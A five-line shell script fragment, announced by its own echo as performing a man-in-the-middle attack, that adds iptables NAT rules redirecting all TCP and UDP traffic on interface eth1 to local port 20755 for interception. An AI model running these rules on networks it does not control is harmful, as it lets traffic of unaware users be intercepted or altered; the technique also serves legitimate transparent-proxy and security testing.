laniface="eth1"

echo "Performing MITM on $laniface"
iptables -t nat -A PREROUTING -j REDIRECT -i $laniface -p tcp -m tcp --to-ports 20755
iptables -t nat -A PREROUTING -j REDIRECT -i $laniface -p udp -m udp --to-ports 20755
